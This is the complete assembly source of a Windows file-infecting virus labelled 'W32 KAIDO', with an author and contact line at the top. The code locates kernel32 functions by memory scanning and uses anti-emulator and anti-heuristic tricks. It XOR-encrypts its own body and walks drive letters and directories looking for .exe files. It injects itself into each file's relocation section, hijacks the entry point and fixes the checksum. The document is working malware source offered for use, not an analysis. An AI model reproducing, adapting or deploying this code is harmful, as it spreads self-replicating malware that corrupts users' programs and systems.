   ;----------------------------  W32 KAIDO BY HenKy -----------------------------
   ;
   ;-AUTHOR:        HenKy
   ;
   ;-MAIL:          HenKy_@latinmail.com
   ;
   ;-ORIGIN:        SPAIN
   ;


   .586P
   PMMX
   .MODEL FLAT
   LOCALS


   EXTRN       ExitProcess:PROC

   MIX_SIZ     EQU FILE_END-MEGAMIX
   MIX_MEM     EQU MEM_END-MEGAMIX
   MARKA       EQU 66
   FLAGZ       EQU 00000020H OR 20000000H OR 80000000H
   KERNEL95    EQU 0BFF70000H
   KERNELNT    EQU 077F00000H
   KERNEL2K    EQU 077E00000H
   KERNEL2KB   EQU 077ED0000H

   MACROSIZE MACRO

           DB      MIX_SIZ/01000 MOD 10 + "0"
           DB      MIX_SIZ/00100 MOD 10 + "0"
           DB      MIX_SIZ/00010 MOD 10 + "0"
           DB      MIX_SIZ/00001 MOD 10 + "0"

           ENDM

   MACROMEM MACRO

           DB      MIX_MEM/01000 MOD 10 + "0"
           DB      MIX_MEM/00100 MOD 10 + "0"
           DB      MIX_MEM/00010 MOD 10 + "0"
           DB      MIX_MEM/00001 MOD 10 + "0"

           ENDM

   MACROHEAP MACRO

           DB      (MIX_MEM-MIX_SIZ)/01000 MOD 10 + "0"
           DB      (MIX_MEM-MIX_SIZ)/00100 MOD 10 + "0"
           DB      (MIX_MEM-MIX_SIZ)/00010 MOD 10 + "0"
           DB      (MIX_MEM-MIX_SIZ)/00001 MOD 10 + "0"

           ENDM

   .DATA
           DB       'PHYSICAL SIZE = '

           MACROSIZE

           DB       ' BYTES',0

           DB       'VIRTUAL SIZE = '

           MACROMEM

           DB       ' BYTES',0

           DB       'CODE IN HEAP = '

           MACROHEAP

           DB       ' BYTES',0

   .CODE

   FAKE:


   MEGAMIX:   ; I HATE CODE EMULATORS !!!

           PUSH    401005H
           NABLA   EQU $-4

   DELTA:  POP     EDI
           JMP     ANTI1
                                 ; W95 NathaN ALIKE DECRYPTOR
   DESBRAZADOR: INC     EDI
               JMP DESMEMBRADOR

   AMPUTADOR:
            REP CALL SUXIO
            LOOPNZ  DESGRACIADO
            REP CALL SUXIO
            JMP CRYPTOTRON
   ANTI3:
           SUB     EDI,OFFSET DELTA
           REP CALL SUXIO
           JMP     ANTI4

   ANTI2:
           REP CALL SUXIO
           ADD     EDI,OFFSET CRYPTOTRON
           JMP     ANTI3

   DESGRACIADO:

           XOR     BYTE PTR [EDI],0
           KEY1    EQU $-1
           JMP     DESBRAZADOR

   SUXIO:  RET

   DESMEMBRADOR:
           REP CALL SUXIO
           FNOP
           JMP AMPUTADOR

   ANTI4:
           MOV     ECX,(FILE_END-CRYPTOTRON)
           REP     CALL SUXIO
           JMP     DESGRACIADO
   ANTI1:
           PUSH    EDI
           REP CALL SUXIO
           JMP     ANTI2

   CRYPTOTRON:


           MOV     ECX,4
           REP     CALL RRR ; HEURISTIC KILLER
           FNOP
           POP     EBP
           XOR     EAX,EAX
           INC     EAX
       CPUID
       TEST    EDX,00800000H
       JZ      WARNING

           EMMS

           MOVD    MM0,[ESP]
           MOVQ    MM7,MM0
           MOVD    EAX, MM7

           XOR     AX,AX
     SZ:
           CMP     BYTE PTR [EAX],'M'
           JZ      F_GPA
           SUB     EAX,1000H
           JMP     SZ

   RRR:    FNOP
           JMP     KISO
   ASCO:   POP     EDX
           JMP     FOTO
   KISO:   PUSH    EDX
           JMP     ASCO
   FOTO:
           RET

   F_GPA:  CALL    RUINOSO

   GPA_95  DB      0C2H,04H,00H,57H,6AH,22H,2Bh,0D2H
   GPA_NT  DB      0C2H,04H,00H,55H,8Bh,4CH,24H,0CH
   GPA_2KB DB      48H,03H,00H,55H,8Bh,0ECh,51H,51H
   ;GPA_2K  DB      00FH,00H,00H,55H,8Bh,0ECh,51H,51H

   RUINOSO:

           POP     ESI
           MOV     EDI,EAX
           PUSH    EAX
           BSWAP   EAX

           CMP     AL,0BFH
           JZ      SCANIT
           CMP     AH,0F0H
           JZ      WNT
   W2000:
           ADD     ESI,8

   WNT:
           ADD     ESI,8

   SCANIT:
           MOV     EDX,800000

   SCANKRNL:

           PUSH    8
           POP     ECX
           PUSH    ESI
           PUSH    EDI
           REPZ    CMPSB
           POP     EDI
           POP     ESI
           JZ      FOUND
           INC     EDI
           DEC     EDX
           JZ      WARNING
           JMP     SCANKRNL

   FOUND:
           INC     EDI
           INC     EDI
           INC     EDI
           MOV     [EBP+GPA-DELTA], EDI
           POP     EBX

           CALL    RAISTLIN

       DB 'CreateFileA',0
       DB 'CloseHandle',0
       DB 'FindFirstFileA',0
       DB 'FindNextFileA',0
       DB 'MapViewOfFile',0
       DB 'UnmapViewOfFile',0
       DB 'CreateFileMappingA',0
       DB 'SetCurrentDirectoryA',0
       DB 'CreateThread',0
       DB 'SetThreadPriority',0
       DB 'Sleep',0
       DB 'GetFileAttributesA',0
       DB 'SetFileAttributesA',0
           DB 'GlobalAlloc',0
           DB 'GlobalFree',0
           DB 'GetTickCount',0
           DB  0

   RAISTLIN:

           POP     ESI
           CALL    MAJERE

   CreateFile          DD 0
   CloseHandle         DD 0
   FindFirstFile       DD 0
   FindNextFile        DD 0
   MapViewOfFile       DD 0
   UnmapViewOfFile     DD 0
   CreateFileMappingA  DD 0
   SetCurrentDirectory DD 0
   CreateThread        DD 0
   SetThreadPriority   DD 0
   Sleep               DD 0
   GetFileAttributesA  DD 0
   SetFileAttributesA  DD 0
   GlobalAlloc         DD 0
   GlobalFree          DD 0
   GetTickCount        DD 0

   MAJERE:
           POP     EDI
   GPI:    PUSH    ESI
           PUSH    EBX
           CALL    [EBP+GPA-DELTA]
           CLD
           STOSD

    NPI:
           LODSB
           TEST    AL, AL
           JNZ     SHORT NPI
           CMP     [ESI], AL
           JNZ     GPI

   THREAD_C:

           ;PUSH    -2
           ;PUSH    -2
           ;CALL    DWORD PTR [EBP+SetThreadPriority-DELTA]

           ;CDQ
           ;LEA     EAX,[EBP+THR-DELTA]
           ;PUSH    EAX
           ;PUSH    EDX
           ;PUSH    EDX
           ;LEA     EAX,[EBP+WARNING-DELTA]
           ;PUSH    EAX
           ;PUSH    EDX
           ;PUSH    EDX
           ;CALL    DWORD PTR [EBP+CreateThread-DELTA]

           ;CALL    DELAY

   BUCLE:
           CALL    INFECT
           PUSH    8
           POP     ECX
   SLOOP:
           PUSH    ECX
           CALL    DRIP

   DRIV    DB      'B:\',0

   DRIP:
           POP     EDX
           INC     BYTE PTR [EDX]
           CALL    SCANNER
           POP     ECX
           LOOP    SLOOP
           MOV     BYTE PTR [EBP+DRIV-DELTA],'B'
           ;JMP     BUCLE


   WARNING:

           MOV     EDI,12345678H
           ZONE    EQU $-4
           PUSH    EDI
       LEA     ESI,DWORD PTR [EBP+SALVANTE-DELTA]
           PUSH    2
           POP     ECX
           REP     MOVSD
           RET


   INFECT:

           ;CALL    DELAY
            CALL    PODERZ

   FILETIME  STRUC

   FT_dwLowDateTime    DD ?
   FT_dwHighDateTime   DD ?

   FILETIME   ENDS

   Win32FindData:

   WFD_dwFileAttributes    DD ?
   WFD_ftCreationTime      FILETIME ?
   WFD_ftLastAccessTime    FILETIME ?
   WFD_ftLastWriteTime     FILETIME ?
   WFD_nFileSizeHigh       DD ?
   WFD_nFileSizeLow        DD ?
   WFD_dwReserved0         DD ?
   WFD_dwReserved1         DD ?
   FNAME                   DB 260H  DUP (?)



   PODERZ:
           CALL    LLEPOR

   IMASK   DB      "*.ExE",0

   LLEPOR:
           CALL    DWORD PTR [EBP+FindFirstFile-DELTA]
           MOV     DWORD PTR [EBP+SearcHandle-DELTA],EAX


   LOOPER:
           INC     EAX
           JZ      RETOX
           DEC     EAX
           TEST    EAX,EAX
           JNZ     ALLKEY
   RETOX:
           RET

           NEW_EIP DD 0

   SALVANTE:

       DB       16 DUP (90H)



   ALLKEY:

           PUSH    DWORD PTR [EBP+SALVANTE-DELTA]
           PUSH    DWORD PTR [EBP+SALVANTE-DELTA+4]
           PUSH    DWORD PTR [EBP+NEW_EIP-DELTA]
           PUSH    DWORD PTR [EBP+ZONE-DELTA]
           LEA     EBX ,[EBP+offset FNAME-DELTA]        ; OPEN IT!

           PUSH    EBX
       CALL    DWORD PTR [EBP+GetFileAttributesA-DELTA]

           AND     AL, NOT 00000001b

       PUSH    EAX
       PUSH    EBX
       CALL    DWORD PTR [EBP+SetFileAttributesA-DELTA]

           CDQ
           PUSH    EDX
           PUSH    80h
           PUSH    3
           PUSH    EDX
           PUSH    EDX
           PUSH    0C0000000h
           PUSH    EBX
           CALL    DWORD PTR [EBP+CreateFile-DELTA]

           INC     EAX
           JZ      Cerrar
           DEC     EAX
           MOV     DWORD PTR [EBP+FileHandle-DELTA],EAX  ; SAVE HNDL
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           CDQ
           PUSH    EDX
           PUSH    ECX
           PUSH    EDX
           PUSH    4H
           PUSH    EDX
           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CreateFileMappingA-DELTA]
           TEST    EAX,EAX
           JNZ     CONTNUE

   Cerrar:

           POP     DWORD PTR [EBP+ZONE-DELTA]
           POP     DWORD PTR [EBP+NEW_EIP-DELTA]
           POP     DWORD PTR [EBP+SALVANTE-DELTA+4]
           POP     DWORD PTR [EBP+SALVANTE-DELTA]

           PUSH    DWORD PTR [EBP+FileHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]

           LEA     EAX, [EBP+offset Win32FindData-DELTA]
           PUSH    EAX
           PUSH    DWORD PTR [EBP+SearcHandle-DELTA]
           CALL    DWORD PTR [EBP+FindNextFile-DELTA]
           JMP     LOOPER

   CONTNUE:

           MOV     DWORD PTR [EBP+MapHandle-DELTA],EAX
           MOV     ECX, DWORD PTR [EBP+WFD_nFileSizeLow-DELTA]
           CDQ
           PUSH    ECX
           PUSH    EDX
           PUSH    EDX
           INC     EDX
           INC     EDX
           PUSH    EDX
           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+MapViewOfFile-DELTA]
           TEST    EAX,EAX
           JZ      Cerrar

           MOV     DWORD PTR [EBP+MapAddress-DELTA],EAX
           MOV     ESI,EAX                         ; GET PE HDR
           MOV     ESI,[EAX+3CH]
           ADD     ESI,EAX
           CMP     BYTE PTR [ESI],"P"            ; IS A 'P'E ?
           JNZ     Cerrar

           PUSH    ESI
           MOV     EBX,[ESI+74H]
           SHL     EBX,3           ; MAKE FIRST SECTION WRITEABLE
           ADD     ESI,78H
           ADD     ESI,EBX
           OR      DWORD PTR [ESI+24H], 0C0000000h
           MOV     ECX,[ESI+20]
           MOV     EDX,[ESI+12]
           SUB     EDX,ECX
           MOV     DWORD PTR [EBP+SUBBER-DELTA],EDX
           MOV     EAX,[ESI+8]
           ADD     EAX,[ESI+12]
           MOV     DWORD PTR [EBP+SIZO-DELTA],EAX
           MOV     EBX,ESI
           POP     ESI

           CMP     BYTE PTR [EBX],'p' ; AVOID PE COMPACT AND PETITE
           JZ      Cerrar
           CMP     BYTE PTR [EBX],'f' ; AVOID PE CRYPT32
           JZ      Cerrar

           MOV     EBX,[ESI+28H]
           MOV     EAX,12345678H
           SIZO    EQU $-4
           CMP     EAX,EBX
           JB      Cerrar

           CMP     BYTE PTR [ESI+MARKA],"H"     ; HenKy IS HERE ?
           JZ      Cerrar

           MOV     EAX,DWORD PTR [EBP+MapAddress-DELTA]    ; AGAIN
           MOV     ESI,[EAX+3CH]
           ADD     ESI,EAX
           MOV     EDI,ESI
           MOVZX   EAX,WORD PTR [EDI+06H]
           DEC     EAX
           IMUL    EAX,EAX,28H
           ADD     ESI,EAX
           ADD     ESI,78H
           MOV     EDX,[EDI+74H]
           SHL     EDX,3
           ADD     ESI,EDX
           XOR     ECX,ECX
           MOV     CL,BYTE PTR [EDI+6]
           CMP     BYTE PTR [ESI],'w' ; AVOID WINZIP'S SFX'S
           JZ      Cerrar
           PUSH    ESI

   SERCH:
           CMP     DWORD PTR [ESI],"ler."
           JZ      NIZE
           SUB     ESI,40
           LOOP    SERCH
           JMP     Cerrar

   NIZE:
           POP     ECX
           MOV     ECX,[EDI+3CH]
           MOV     EBX,[EDI+56]
           CMP     ECX,EBX
           JNZ     NIXX
           CDQ
           MOV     [EBP+SUBBER-DELTA],EDX

   NIXX:

           MOV     DWORD PTR [ESI],"adr."
           MOV     WORD PTR  [ESI+4],"at"
           CMP     DWORD PTR [ESI+8],MIX_SIZ
           JB      Cerrar

           MOV     EAX,[ESI+20]
           MOV     DWORD PTR [EBP+NEW_EIP-DELTA],EAX
           OR      DWORD PTR [ESI+24H], FLAGZ

           MOV     EAX,[ESI+12] ; RVA
           ADD     EAX,[EDI+34H]     ; IMAGE BASE
           MOV     [EBP+BASS-DELTA],EAX

   OKA:
           PUSHAD                      ; SAVE OLD DATA
           MOV     ESI,[EDI+28H]
           MOV     [EBP+ZONE-DELTA],ESI
           MOV     EAX,[EDI+34H]
           ADD     [EBP+ZONE-DELTA],EAX
           SUB     ESI,12345678h
           SUBBER  EQU $-4
           ADD     ESI,DWORD PTR [EBP+MapAddress-DELTA]
           LEA     EDI,[EBP+SALVANTE-DELTA]
           PUSH    2
           POP     ECX
           REP     MOVSD
           POPAD

           PUSHAD
           MOV     BYTE PTR [EDI+MARKA],"H"     ; HenKy RULEEZZ
           MOV     EDI,[EDI+28H]
           ADD     EDI,DWORD PTR [EBP+MapAddress-DELTA]
           SUB     EDI,DWORD PTR [EBP+SUBBER-DELTA]
           LEA     ESI,[EBP+SUXX-DELTA] ; COPY NEW DATA
           PUSH    2
           POP     ECX
           REP     MOVSD
           POPAD

           MOV     EAX,[EBP+BASS-DELTA]
           ADD     EAX,5
           MOV     [EBP+NABLA-DELTA],EAX

           PUSHAD
           CALL    [EBP+GetTickCount-DELTA]
           MOV     BYTE PTR [EBP+KEY1-DELTA],AL
           MOV     BYTE PTR [EBP+DEY1-DELTA],AL

           PUSH    MIX_SIZ
       XOR     ECX,ECX
           PUSH    ECX
           CALL    DWORD PTR [EBP+GlobalAlloc-DELTA]
       MOV     DWORD PTR [EBP+G_HNDL-DELTA],EAX

           MOV     EDI,EAX
           LEA     ESI,[EBP+MEGAMIX-DELTA]
           PUSH    (MIX_SIZ/4)
           POP     ECX
           CLD
           REP     MOVSD

           MOV     ECX, (FILE_END-CRYPTOTRON)

   CIPH:
           DEC     EDI
           XOR     BYTE PTR [EDI],0
           DEY1    EQU $-1

           LOOP    CIPH
           POPAD

           PUSHAD
           MOV     ESI,12345678H
           G_HNDL  EQU $-4
           MOV     EDI,DWORD PTR [EBP+NEW_EIP-DELTA]
           ADD     EDI,DWORD PTR [EBP+MapAddress-DELTA]
           PUSH    (MIX_SIZ / 4)
           POP     ECX
           REP     MOVSD
           POPAD

           PUSH    DWORD PTR [EBP+G_HNDL-DELTA]
           CALL    DWORD PTR [EBP+GlobalFree-DELTA]

           CDQ
           CMP     DWORD PTR [EDI+58H], EDX
       JZ      UnMapFile
           MOV     DWORD PTR [EDI+58H], EDX
           MOV     ESI, [EBP+MapAddress-DELTA]
           MOV     ECX, [EBP+WFD_nFileSizeLow-DELTA]
           SHR     ECX, 1

   CHK_LOOP:

           MOVZX   EAX, WORD PTR [ESI]
           ADD     EDX, EAX
       MOV     EAX, EDX
       AND     EDX, 0FFFFh
       SHR     EAX, 16
       ADD     EDX, EAX
       INC     ESI
           INC     ESI
           LOOP    CHK_LOOP
           MOV     EAX, EDX
       SHR     EAX, 16
           ADD     AX, DX
           ADD     EAX, [EBP+WFD_nFileSizeLow-DELTA]
           MOV     DWORD PTR [EDI+58H], EAX

   UnMapFile:

           PUSH    DWORD PTR [EBP+MapAddress-DELTA]
           CALL    DWORD PTR [EBP+UnmapViewOfFile-DELTA]

   CloseMap:

           PUSH    DWORD PTR [EBP+MapHandle-DELTA]
           CALL    DWORD PTR [EBP+CloseHandle-DELTA]
           JMP     Cerrar


   SUXX:

           PUSH    12345678H
           BASS    EQU $-4
           RET

           SUX_SIZ EQU $-SUXX

   DELAY:
           PUSH    10000
           CALL    DWORD PTR [EBP+Sleep-DELTA]
           RET

   SET_DIR:

            PUSH    EDX
            CALL    [EBP+SetCurrentDirectory-DELTA]
            ;CALL    DELAY
            RET

   SCANNER:

            CALL    SET_DIR

   RECURSIVE:

            CALL    INFECT
            LEA     EAX, [EBP+Win32FindData-DELTA]
            PUSH    EAX
            CALL    ZUXX

   DIR2     DB      "*.",0

   ZUXX:
            CALL    [EBP+FindFirstFile-DELTA]
            MOV     EDI, EAX
            INC     EAX
            JZ      NOMORE

   PROCESS:

            LEA     EAX, [EBP+WFD_dwFileAttributes-DELTA]
            MOV     AL, [EAX]
            CMP     AL, 10H
            JNE     NEXT
            LEA     EDX, [EBP+FNAME-DELTA]
            CMP     BYTE PTR [EDX], '.'
            JE      NEXT
            CALL    SET_DIR
            PUSH    EDI
            LEA     EDX, [EBP+FNAME-DELTA]
            CALL    RECURSIVE
            POP     EDI
            CALL    SEDD

   PDIR     DB      "..",0

   SEDD:    POP     EDX
            CALL    SET_DIR

   NEXT:

            LEA     EAX, [EBP+Win32FindData-DELTA]
            PUSH    EAX
            PUSH    EDI
            CALL    [EBP+FindNextFile-DELTA]
            OR      EAX, EAX
            JNZ     PROCESS

   NOMORE:

           RET

           DB       '<W32/KAIDO DESIGNED BY HenKy>'

   THR                 DD 0
   GPA                 DD 0
   SearcHandle         DD 0
   FileHandle          DD 0
   MapHandle           DD 0
   MapAddress          DD 0

   ALIGN 4


   FILE_END   LABEL BYTE

   FNOP
   FNOP

   ALIGN 4

   MEM_END   LABEL BYTE

   EXITPROC:

           PUSH 0
           CALL ExitProcess

   ENDS
   END FAKE
